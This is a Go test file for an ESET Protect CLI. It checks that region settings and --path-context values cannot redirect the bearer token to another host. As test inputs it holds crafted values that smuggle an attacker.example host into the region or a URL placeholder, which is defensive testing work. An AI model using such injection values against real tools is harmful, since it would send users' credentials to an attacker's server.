// Copyright 2026 Servosity Inc. and msp-skills contributors. Licensed under Apache-2.0. See LICENSE.

package cli

import (
	"bytes"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"eset-protect-pp-cli/internal/client"
	"eset-protect-pp-cli/internal/cliutil/testenv"
	"eset-protect-pp-cli/internal/config"
)

type pinRecorder struct {
	mu   sync.Mutex
	sent []string // host + Authorization of every request that reached the wire
}

func (r *pinRecorder) RoundTrip(req *http.Request) (*http.Response, error) {
	r.mu.Lock()
	r.sent = append(r.sent, req.URL.Host+" "+req.Header.Get("Authorization"))
	r.mu.Unlock()
	return &http.Response{StatusCode: http.StatusOK, Body: http.NoBody, Header: http.Header{}, Request: req}, nil
}

// TestSyncPathContextCannotSteerBearerToken (handfixes.json:
// credential-host-pinning): --path-context substitutes {region} after the
// region check, so `sync --path-context region=attacker.example/` (reachable
// from MCP too) turns the service host into attacker.example. The credential
// host pin must refuse that request before it reaches the network.
func TestSyncPathContextCannotSteerBearerToken(t *testing.T) {
	testenv.Isolate(t)
	respondClearHarness(t)
	t.Setenv("ESET_PROTECT_BASE_URL", "")
	t.Setenv("ESET_PROTECT_TOKEN", "test-token")
	t.Setenv("ESET_PROTECT_REGION", "eu")
	t.Setenv("ESET_PROTECT_USERNAME", "")
	t.Setenv("ESET_PROTECT_PASSWORD", "")

	// Replace the network under the ESET transport with a recorder, so the
	// test sees exactly what would have left the machine.
	rec := &pinRecorder{}
	saved := clientHooks
	t.Cleanup(func() { clientHooks = saved })
	clientHooks = append(append([]func(*client.Client) error{}, saved...), func(c *client.Client) error {
		if tr, ok := c.HTTPClient.Transport.(*client.EsetTransport); ok {
			tr.Base = rec
		}
		return nil
	})

	cmd := RootCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"sync", "--resources", "devices", "--path-context", "region=attacker.example/", "--json", "--home", t.TempDir()})
	_ = cmd.Execute()

	for _, s := range rec.sent {
		if strings.HasPrefix(s, "attacker.example") {
			t.Fatalf("the bearer token was sent to the steered host: %q\n%s", s, out.String())
		}
	}
	// Since region-normalized-and-validated the steered value is refused as
	// a region before any request is built; the credential pin (unit-tested
	// in eset_auth_test.go) stays behind it as the second wall.
	if !strings.Contains(out.String(), `invalid --path-context region`) || !strings.Contains(out.String(), "eu, de, us, ca, jpn") {
		t.Fatalf("the steered region was not refused:\n%s", out.String())
	}
	if len(rec.sent) != 0 {
		t.Fatalf("a refused --path-context region still sent requests: %v", rec.sent)
	}
}

// TestRegionIsNormalizedAndValidated (handfixes.json: region-normalized-and-validated):
// an uppercase region (ESET_PROTECT_REGION=US, or --path-context region=US)
// reaches the lowercase ESET host for both the service call and the pin, and a
// value that is not an ESET Connect region fails up front with a message that
// names ESET_PROTECT_REGION and the valid values, never as a host-pin
// "security" refusal.
func TestRegionIsNormalizedAndValidated(t *testing.T) {
	run := func(t *testing.T, region string, extra ...string) (string, []string, error) {
		t.Helper()
		testenv.Isolate(t)
		respondClearHarness(t)
		t.Setenv("ESET_PROTECT_BASE_URL", "")
		t.Setenv("ESET_PROTECT_TOKEN", "test-token")
		t.Setenv("ESET_PROTECT_REGION", region)
		t.Setenv("ESET_PROTECT_USERNAME", "")
		t.Setenv("ESET_PROTECT_PASSWORD", "")
		rec := &pinRecorder{}
		saved := clientHooks
		t.Cleanup(func() { clientHooks = saved })
		clientHooks = append(append([]func(*client.Client) error{}, saved...), func(c *client.Client) error {
			if tr, ok := c.HTTPClient.Transport.(*client.EsetTransport); ok {
				tr.Base = rec
			}
			return nil
		})
		cmd := RootCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		cmd.SetErr(&out)
		cmd.SetArgs(append([]string{"sync", "--resources", "devices", "--json", "--home", t.TempDir()}, extra...))
		err := cmd.Execute()
		rec.mu.Lock()
		defer rec.mu.Unlock()
		return out.String(), append([]string(nil), rec.sent...), err
	}
	for _, tc := range []struct {
		name, region string
		extra        []string
	}{
		{"env US", "US", nil},
		{"env padded Us with a scheme", "  https://Us/ ", nil},
		{"path-context US matching the configured region", "us", []string{"--path-context", "region=US"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, sent, _ := run(t, tc.region, tc.extra...)
			if strings.Contains(out, "refusing to send ESET credentials") {
				t.Fatalf("an uppercase region was refused by the credential pin:\n%s", out)
			}
			if len(sent) == 0 {
				t.Fatalf("nothing was sent:\n%s", out)
			}
			for _, s := range sent {
				if !strings.HasPrefix(s, "us.device-management.eset.systems ") {
					t.Fatalf("request went to %q, want the lowercase us host", s)
				}
			}
		})
	}
	for _, tc := range []struct {
		name, region, source string
		extra                []string
	}{
		{"env not a region", "xyz", "ESET_PROTECT_REGION", nil},
		{"env injected host", "eu.attacker.example", "ESET_PROTECT_REGION", nil},
		{"path-context not a region", "eu", "--path-context region", []string{"--path-context", "region=xx"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, sent, err := run(t, tc.region, tc.extra...)
			if err == nil || !strings.Contains(out+err.Error(), "invalid "+tc.source) || !strings.Contains(out+err.Error(), "eu, de, us, ca, jpn") || !strings.Contains(out+err.Error(), "ESET_PROTECT_REGION") {
				t.Fatalf("a non-ESET region must fail naming %s and the valid values: err=%v\n%s", tc.source, err, out)
			}
			if len(sent) != 0 {
				t.Fatalf("a refused region still sent requests: %v", sent)
			}
		})
	}
}

// TestSyncPathContextRegionMustMatchTheConfiguredRegion (Codex round 3, P2):
// newClient mints the token for the configured region and the scoped mirror
// is chosen by it, so `sync --path-context region=us` with an eu
// configuration used to authenticate against eu and then call us. A
// different region is now refused before any token request, naming
// ESET_PROTECT_REGION; the same region (any case) runs.
func TestSyncPathContextRegionMustMatchTheConfiguredRegion(t *testing.T) {
	run := func(t *testing.T, envRegion string, extra ...string) (string, int, error) {
		t.Helper()
		testenv.Isolate(t)
		respondClearHarness(t)
		var mints int32
		mint := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			atomic.AddInt32(&mints, 1)
			w.Header().Set("Content-Type", "application/json")
			_, _ = io.WriteString(w, `{"access_token":"minted-token","token_type":"Bearer","expires_in":3600}`)
		}))
		t.Cleanup(mint.Close)
		saved := esetTokenURLOverride
		esetTokenURLOverride = mint.URL
		t.Cleanup(func() { esetTokenURLOverride = saved })
		t.Setenv("ESET_PROTECT_BASE_URL", "")
		t.Setenv("ESET_PROTECT_TOKEN", "")
		t.Setenv("ESET_PROTECT_REGION", envRegion)
		t.Setenv("ESET_PROTECT_USERNAME", "api-user@example.invalid")
		t.Setenv("ESET_PROTECT_PASSWORD", "not-a-real-password")
		rec := &pinRecorder{}
		savedHooks := clientHooks
		t.Cleanup(func() { clientHooks = savedHooks })
		clientHooks = append(append([]func(*client.Client) error{}, savedHooks...), func(c *client.Client) error {
			if tr, ok := c.HTTPClient.Transport.(*client.EsetTransport); ok {
				tr.Base = rec
			}
			return nil
		})
		cmd := RootCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		cmd.SetErr(&out)
		cmd.SetArgs(append([]string{"sync", "--resources", "devices", "--json", "--home", t.TempDir()}, extra...))
		err := cmd.Execute()
		return out.String(), int(atomic.LoadInt32(&mints)), err
	}
	t.Run("different region refused before minting", func(t *testing.T) {
		out, mints, err := run(t, "eu", "--path-context", "region=us")
		if err == nil || !strings.Contains(out+err.Error(), "set ESET_PROTECT_REGION=us") || !strings.Contains(out+err.Error(), "configured region eu") {
			t.Fatalf("a region override that differs from the configured region must be refused: %v\n%s", err, out)
		}
		if mints != 0 {
			t.Fatalf("a token was minted for the configured region before the override was refused: %d mints", mints)
		}
	})
	t.Run("same region runs", func(t *testing.T) {
		out, mints, _ := run(t, "us", "--path-context", "region=US")
		if strings.Contains(out, "differs from the configured region") || mints == 0 {
			t.Fatalf("a matching override must run and mint: %d mints\n%s", mints, out)
		}
	})
}

// TestConfigFileRegionIsHonored (adversarial round 3, P2): config.Load used
// to overwrite a [template_vars] region in config.toml with eu whenever
// ESET_PROTECT_REGION was unset. (Token saves no longer write the env or
// default region there at all: region-never-persisted, round 4.) The file's region is now used (normalized and
// validated), ESET_PROTECT_REGION still wins, a bad file value fails naming
// the file, and doctor's region row says where the region came from.
func TestConfigFileRegionIsHonored(t *testing.T) {
	setup := func(t *testing.T, fileRegion, envRegion string) string {
		t.Helper()
		testenv.Isolate(t)
		respondClearHarness(t)
		t.Setenv("ESET_PROTECT_BASE_URL", "")
		t.Setenv("ESET_PROTECT_TOKEN", "test-token")
		t.Setenv("ESET_PROTECT_USERNAME", "")
		t.Setenv("ESET_PROTECT_PASSWORD", "")
		t.Setenv("ESET_PROTECT_REGION", envRegion)
		path := filepath.Join(t.TempDir(), "config.toml")
		if err := os.WriteFile(path, []byte("[template_vars]\nregion = '"+fileRegion+"'\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		return path
	}
	// exec runs the CLI with the network replaced by a recorder and returns
	// the output and the hosts that would have been called.
	exec := func(t *testing.T, args ...string) (string, []string, error) {
		t.Helper()
		rec := &pinRecorder{}
		saved := clientHooks
		t.Cleanup(func() { clientHooks = saved })
		clientHooks = append(append([]func(*client.Client) error{}, saved...), func(c *client.Client) error {
			if tr, ok := c.HTTPClient.Transport.(*client.EsetTransport); ok {
				tr.Base = rec
			}
			return nil
		})
		cmd := RootCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		cmd.SetErr(&out)
		cmd.SetArgs(args)
		err := cmd.Execute()
		rec.mu.Lock()
		defer rec.mu.Unlock()
		return out.String(), append([]string(nil), rec.sent...), err
	}
	onlyHost := func(sent []string, host string) bool {
		for _, s := range sent {
			if !strings.HasPrefix(s, host+" ") {
				return false
			}
		}
		return len(sent) > 0
	}
	t.Run("file region used", func(t *testing.T) {
		path := setup(t, " US ", "")
		out, sent, _ := exec(t, "devices", "list", "--data-source", "live", "--json", "--config", path)
		if !onlyHost(sent, "us.device-management.eset.systems") {
			t.Fatalf("the config file's region must be used: sent %v\n%s", sent, out)
		}
		cfg, err := config.Load(path)
		if err != nil || cfg.RegionSource != config.RegionSourceFile {
			t.Fatalf("region source = %q %v", cfg.RegionSource, err)
		}
		report := map[string]any{"api": "OK reachable"}
		esetDoctorRegionVerdict(cfg, report)
		if api, _ := report["api"].(string); !strings.HasPrefix(api, "INFO ") || !strings.Contains(api, "us region from the config file") || !strings.Contains(api, path) {
			t.Fatalf("doctor's region row must name the config file: %q", api)
		}
	})
	t.Run("env wins", func(t *testing.T) {
		path := setup(t, "us", "de")
		out, sent, _ := exec(t, "devices", "list", "--data-source", "live", "--json", "--config", path)
		if !onlyHost(sent, "de.device-management.eset.systems") {
			t.Fatalf("ESET_PROTECT_REGION must win over the file: sent %v\n%s", sent, out)
		}
	})
	t.Run("bad file region names the file", func(t *testing.T) {
		path := setup(t, "xx", "")
		out, sent, err := exec(t, "devices", "list", "--data-source", "live", "--json", "--config", path)
		if len(sent) != 0 {
			t.Fatalf("a bad config-file region still sent requests: %v", sent)
		}
		if err == nil || !strings.Contains(out+err.Error(), "[template_vars] region") || !strings.Contains(out+err.Error(), "eu, de, us, ca, jpn") {
			t.Fatalf("a bad config-file region must fail naming the file: %v\n%s", err, out)
		}
	})
	t.Run("no file region defaults to eu with the default note", func(t *testing.T) {
		testenv.Isolate(t)
		t.Setenv("ESET_PROTECT_REGION", "")
		cfg, err := config.Load(filepath.Join(t.TempDir(), "absent.toml"))
		if err != nil || cfg.TemplateVars["region"] != "eu" || cfg.RegionSource != "" {
			t.Fatalf("default region = %q source %q %v", cfg.TemplateVars["region"], cfg.RegionSource, err)
		}
	})
}

// TestSyncPathContextRefusesUnknownKeys (handfixes.json:
// path-context-known-keys-only): replacePathParam substitutes "{"+key+"}" for
// any key, so a key that spans from {region} to {policyUuid} rewrites the host
// without ever passing the region check. Unknown keys must fail up front with
// no request built; a known key must still be accepted.
func TestSyncPathContextRefusesUnknownKeys(t *testing.T) {
	testenv.Isolate(t)
	respondClearHarness(t)
	t.Setenv("ESET_PROTECT_BASE_URL", "")
	t.Setenv("ESET_PROTECT_TOKEN", "test-token")
	t.Setenv("ESET_PROTECT_REGION", "eu")
	t.Setenv("ESET_PROTECT_USERNAME", "")
	t.Setenv("ESET_PROTECT_PASSWORD", "")

	rec := &pinRecorder{}
	saved := clientHooks
	t.Cleanup(func() { clientHooks = saved })
	clientHooks = append(append([]func(*client.Client) error{}, saved...), func(c *client.Client) error {
		if tr, ok := c.HTTPClient.Transport.(*client.EsetTransport); ok {
			tr.Base = rec
		}
		return nil
	})

	run := func(pc string) string {
		cmd := RootCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		cmd.SetErr(&out)
		cmd.SetArgs([]string{"sync", "--resources", "ip-sets", "--path-context", pc, "--json", "--home", t.TempDir()})
		_ = cmd.Execute()
		return out.String()
	}

	got := run("region}.network-access-protection.eset.systems/v1/policies/{policyUuid=attacker.example")
	if !strings.Contains(got, "is not a known endpoint placeholder") {
		t.Fatalf("a crafted --path-context key was not refused:\n%s", got)
	}
	if len(rec.sent) != 0 {
		t.Fatalf("a refused --path-context key still sent requests: %v", rec.sent)
	}

	if got := run("policyUuid=00000000-0000-0000-0000-000000000001"); strings.Contains(got, "is not a known endpoint placeholder") {
		t.Fatalf("a known --path-context key was refused:\n%s", got)
	}
}
